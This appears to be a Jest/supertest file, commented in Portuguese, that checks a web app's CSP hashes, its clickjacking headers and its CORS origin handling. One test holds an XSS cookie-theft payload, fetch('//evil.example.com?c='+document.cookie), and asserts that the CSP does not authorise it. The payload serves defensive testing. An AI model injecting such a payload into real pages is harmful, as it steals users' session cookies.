/**
 * securityHeaders.test.js
 * Suite — CSP, clickjacking e CORS
 *
 * Estes testes existem porque todas as falhas que eles cobrem são SILENCIOSAS:
 * a aplicação funciona normalmente com a CSP fraca, com o X-Frame-Options
 * ausente ou com o CORS refletindo qualquer origem. Sem asserção automática,
 * a regressão só aparece num pentest.
 */
const request = require('supertest');
const crypto = require('crypto');
const fs = require('fs');
const path = require('path');

const app = require('../app');
const { calcularHashes } = require('../utils/cspHashes');

const raizFrontend = path.join(__dirname, '../../../');

function csp(res) {
    return res.headers['content-security-policy'] || '';
}
function diretiva(res, nome) {
    return new RegExp(`(?:^|;)\\s*${nome} ([^;]*)`).exec(csp(res))?.[1] || '';
}

describe('CSP: scripts inline sem unsafe-inline', () => {

    it('script-src NAO contem unsafe-inline', async () => {
        const res = await request(app).get('/index.html');
        // 'unsafe-inline' autoriza QUALQUER script inline — inclusive o que um
        // atacante injetar. É o que anula a CSP como defesa contra XSS.
        expect(diretiva(res, 'script-src')).not.toMatch(/'unsafe-inline'/);
    });

    it('script-src autoriza os inline por hash', async () => {
        const res = await request(app).get('/index.html');
        const hashes = (diretiva(res, 'script-src').match(/'sha256-[^']+'/g) || []);
        expect(hashes.length).toBeGreaterThan(0);
    });

    it('todo script inline servido tem hash correspondente na politica', async () => {
        const res = await request(app).get('/index.html');
        const autorizados = new Set(diretiva(res, 'script-src').match(/'sha256-[^']+'/g) || []);

        // Reproduz o cálculo do BROWSER sobre as páginas reais: se algum hash
        // divergir, a página carrega com o script morto — falha que não aparece
        // em nenhum outro teste.
        const paginas = ['index.html', 'html/404.html', 'html/500.html', 'html/dashboard.html'];
        for (const pagina of paginas) {
            const arquivo = path.join(raizFrontend, pagina);
            if (!fs.existsSync(arquivo)) continue;
            const html = fs.readFileSync(arquivo, 'utf8');

            for (const m of html.matchAll(/<script\b([^>]*)>([\s\S]*?)<\/script>/gi)) {
                if (/\bsrc\s*=/i.test(m[1]) || !m[2].trim()) continue;
                const hash = `'sha256-${crypto.createHash('sha256').update(m[2], 'utf8').digest('base64')}'`;
                expect(autorizados.has(hash)).toBe(true);
            }
        }
    });

    it('script injetado por atacante NAO bate com nenhum hash', async () => {
        const res = await request(app).get('/index.html');
        const autorizados = new Set(diretiva(res, 'script-src').match(/'sha256-[^']+'/g) || []);

        const payload = "fetch('//evil.example.com?c='+document.cookie)";
        const hash = `'sha256-${crypto.createHash('sha256').update(payload, 'utf8').digest('base64')}'`;
        expect(autorizados.has(hash)).toBe(false);
    });

    it('os hashes saem dos arquivos realmente servidos', async () => {
        // Garante que a lista não veio de um build defasado: recalcular a partir
        // do disco tem de dar exatamente o mesmo conjunto.
        const res = await request(app).get('/index.html');
        const naPolitica = new Set(diretiva(res, 'script-src').match(/'sha256-[^']+'/g) || []);
        const doDisco = calcularHashes(raizFrontend).hashes;

        expect(doDisco.length).toBe(naPolitica.size);
        doDisco.forEach(h => expect(naPolitica.has(h)).toBe(true));
    });
});

describe('Clickjacking', () => {

    it('X-Frame-Options: DENY', async () => {
        const res = await request(app).get('/index.html');
        expect(res.headers['x-frame-options']).toBe('DENY');
    });

    it("CSP frame-ancestors: 'none' (concorda com o X-Frame-Options)", async () => {
        const res = await request(app).get('/index.html');
        // As duas diretivas discordavam antes (DENY vs SAMEORIGIN herdado).
        expect(diretiva(res, 'frame-ancestors')).toContain("'none'");
    });
});

describe('CORS', () => {

    it('NAO reflete uma origem arbitraria', async () => {
        const res = await request(app)
            .get('/api/ping')
            .set('Origin', 'https://evil.example.com');
        expect(res.headers['access-control-allow-origin']).toBeUndefined();
    });

    it('origem bloqueada responde 403, nao 500', async () => {
        // 500 dispararia o alerta FATAL 'UNHANDLED_ERROR': qualquer um inundaria
        // o canal de alertas mandando Origin aleatória.
        const res = await request(app)
            .get('/api/ping')
            .set('Origin', 'https://evil.example.com');
        expect(res.status).toBe(403);
    });
});
